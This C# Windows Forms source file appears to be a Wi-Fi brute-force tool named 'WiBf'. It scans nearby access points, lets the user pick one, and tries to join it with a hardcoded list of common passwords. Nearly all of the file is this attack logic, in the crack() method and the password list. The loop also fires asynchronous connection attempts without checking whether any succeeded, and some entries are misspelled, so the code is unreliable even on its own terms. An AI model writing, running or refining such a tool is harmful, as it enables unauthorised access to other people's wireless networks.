using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;
using SimpleWifi;
using SimpleWifi.Win32;

namespace WiBf
{
	public partial class Form1 : Form
	{
		private static Wifi wifi;
		List<string> passwords = new List<string>();

		public Form1()
		{
			InitializeComponent();
		}

		private void Form1_Load(object sender, EventArgs e)
		{
			wifi = new Wifi();
			wifi.ConnectionStatusChanged += wifi_ConnectionStatusChanged;
			linkLabel1.Links.Add(12, 7, "https://github.com/Tlgyt");
			passwords.Add("password");
			passwords.Add("123456");
			passwords.Add("12345678");
			passwords.Add("abc123");
			passwords.Add("querty");
			passwords.Add("monkey");
			passwords.Add("letmein");
			passwords.Add("dragon");
			passwords.Add("111111");
			passwords.Add("baseball");
			passwords.Add("iloveyou");
			passwords.Add("trustno1");
			passwords.Add("1234567");
			passwords.Add("sunshine");
			passwords.Add("master");
			passwords.Add("123123");
			passwords.Add("welcome");
			passwords.Add("shadow");
			passwords.Add("ashley");
			passwords.Add("footbal");
			passwords.Add("jesus");
			passwords.Add("michael");
			passwords.Add("ninja");
			passwords.Add("mustang");
			passwords.Add("password1");
			passwords.Add("honey987");
			List();
		}

		private IEnumerable<AccessPoint> List()
		{
			IEnumerable<AccessPoint> accessPoints = wifi.GetAccessPoints().OrderByDescending(ap => ap.SignalStrength);
			foreach (AccessPoint ap in accessPoints)
			{
				listBox1.Items.Add(ap.Name);
			}
			return accessPoints;
		}

		private IEnumerable<AccessPoint> Scan()
		{
			IEnumerable<AccessPoint> accessPoints = wifi.GetAccessPoints().OrderByDescending(ap => ap.SignalStrength);
			return accessPoints;
		}

		private static void wifi_ConnectionStatusChanged(object sender, WifiStatusEventArgs e)
		{
			Console.WriteLine("\nNew status: {0}", e.NewStatus.ToString());
		}

		private static void OnConnectedComplete(bool success)
		{
			Console.WriteLine("\nOnConnectedComplete, success: {0}", success);
		}

		private static bool Connected()
		{
			//Console.WriteLine("\r\n-- CONNECTION STATUS --");
			if (wifi.ConnectionStatus == WifiStatus.Connected)
				//Console.WriteLine("You are connected to a wifi");
				return true;
			else
				//Console.WriteLine("You are not connected to a wifi");
				return false;
		}

		private void crack(AccessPoint selectedAP)
		{
			foreach (string pass in passwords)
			{
				// Auth
				AuthRequest authRequest = new AuthRequest(selectedAP);
				bool overwrite = true;

				if (authRequest.IsPasswordRequired)
				{
					if (overwrite)
					{
						if (authRequest.IsUsernameRequired)
						{
							Console.Write("\r\nPlease enter a username: ");
							authRequest.Username = Console.ReadLine();
						}

						authRequest.Password = pass;

						if (authRequest.IsDomainSupported)
						{
							Console.Write("\r\nPlease enter a domain: ");
							authRequest.Domain = Console.ReadLine();
						}
					}
				}

				selectedAP.ConnectAsync(authRequest, overwrite, OnConnectedComplete);
			}
		}

		private void button1_Click(object sender, EventArgs e)
		{
			try
			{
				var accessPoints = Scan();
				AccessPoint selectedAP = null;

				foreach (AccessPoint ap in accessPoints)
				{
					if (ap.Name == listBox1.SelectedItem.ToString())
					{
						selectedAP = ap;
					}
				}
				crack(selectedAP);
				//Thread t = new Thread(() => crack(selectedAP));t.Start();
			}
			catch (Exception)
			{
				MessageBox.Show("Please select a network from the list");
			}
		}

		private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			System.Diagnostics.Process.Start(e.Link.LinkData.ToString());
		}
	}
}
